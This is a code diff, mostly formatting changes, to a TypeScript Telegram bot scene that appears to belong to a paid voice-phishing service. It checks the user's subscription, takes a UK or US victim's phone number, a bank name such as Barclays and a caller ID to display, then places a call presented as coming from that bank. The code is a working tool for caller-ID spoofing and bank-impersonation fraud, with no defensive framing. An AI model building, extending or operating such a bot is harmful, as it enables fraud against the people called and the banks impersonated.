@@ -5,7 +5,7 @@ import { getUser } from '../utils/getUser';
 
 export const callOnNumInputScene = new Scenes.WizardScene(
   'CALL_ID_ON_NUM_INPUT',
-  async ctx => {
+  async (ctx) => {
     try {
       const { hasExpired } = await getUser({ id: ctx.from?.id as number });
       if (hasExpired) {
@@ -29,7 +29,7 @@ export const callOnNumInputScene = new Scenes.WizardScene(
       return ctx.scene.leave();
     }
 
-    //@ts-expect-error
+    // @ts-expect-error ts doesn't not recognise state
     if (!ctx.message || !ctx.wizard.state.callData) {
       await ctx.reply(
         '🚫 Request expired, start again\n\n',
@@ -39,10 +39,11 @@ export const callOnNumInputScene = new Scenes.WizardScene(
       return ctx.scene.leave();
     }
 
-    const numValid = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(
-      //@ts-expect-error
-      ctx.message.text,
-    );
+    const numValid =
+      /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(
+        // @ts-expect-error ts doesn't not recognise state
+        ctx.message.text,
+      );
 
     if (!numValid) {
       await ctx.reply(
@@ -52,8 +53,8 @@ export const callOnNumInputScene = new Scenes.WizardScene(
     }
     await ctx.replyWithHTML(
       `Good,\nReply with the bank name 🏦\n(e.g ${
-        /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$/g.test(
-          // @ts-expect-error
+        /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
+          // @ts-expect-error ts doesn't not recognise state
           ctx.wizard.state.callData.number,
         )
           ? 'Barclays'
@@ -64,8 +65,8 @@ export const callOnNumInputScene = new Scenes.WizardScene(
 
     return ctx.wizard.next();
   },
-  async ctx => {
-    // @ts-expect-error
+  async (ctx) => {
+    // @ts-expect-error ts doesn't not recognise state
     if (!ctx.message || !ctx.wizard.state.callData) {
       await ctx.reply(
         '🚫 Request expired, start again\n\n',
@@ -75,10 +76,11 @@ export const callOnNumInputScene = new Scenes.WizardScene(
       return ctx.scene.leave();
     }
 
-    const numValid = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(
-      //@ts-expect-error
-      ctx.wizard.state.callData.number,
-    );
+    const numValid =
+      /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(
+        // @ts-expect-error ts doesn't not recognise state
+        ctx.wizard.state.callData.number,
+      );
 
     if (!numValid) {
       await ctx.reply(
@@ -88,8 +90,8 @@ export const callOnNumInputScene = new Scenes.WizardScene(
     }
     await ctx.replyWithHTML(
       `Okay,\nReply with the caller ID 👤\n(e.g ${
-        /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$/g.test(
-          // @ts-expect-error
+        /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
+          // @ts-expect-error ts doesn't not recognise state
           ctx.message.text,
         )
           ? '448081961740'
@@ -97,11 +99,11 @@ export const callOnNumInputScene = new Scenes.WizardScene(
       })\n\n<i>***request will expire in 2 minutes***</i>`,
     );
 
-    // @ts-expect-error
+    // @ts-expect-error ts doesn't not recognise state
     ctx.wizard.state.callData.institutionName = ctx.message.text;
     return ctx.wizard.next();
   },
-  async ctx => {
+  async (ctx) => {
     if (!ctx.message) {
       await ctx.reply(
         '🚫 Request expired, start again\n\n',
@@ -111,21 +113,22 @@ export const callOnNumInputScene = new Scenes.WizardScene(
       return ctx.scene.leave();
     }
 
-    // @ts-expect-error
+    // @ts-expect-error ts doesn't not recognise state
     ctx.wizard.state.callData.callerId = ctx.message.text;
-    // @ts-expect-error
+    // @ts-expect-error ts doesn't not recognise state
     ctx.wizard.state.userCalling = {
-      // @ts-expect-error
+      // @ts-expect-error ts doesn't not recognise state
       [ctx.wizard.state.callData.number]: ctx.chat.id,
     };
 
-    // @ts-expect-error
+    // @ts-expect-error ts doesn't not recognise state
     const { number, institutionName, callerId } = ctx.wizard.state.callData;
-    const from = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$/g.test(
-      number,
-    )
-      ? process.env.UK_NUM
-      : process.env.US_NUM;
+    const from =
+      /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
+        number,
+      )
+        ? process.env.UK_NUM
+        : process.env.US_NUM;
 
     await ctx.reply(
       `Calling ${number}\nfrom ${callerId} as:\n\n${institutionName} 📲...`,
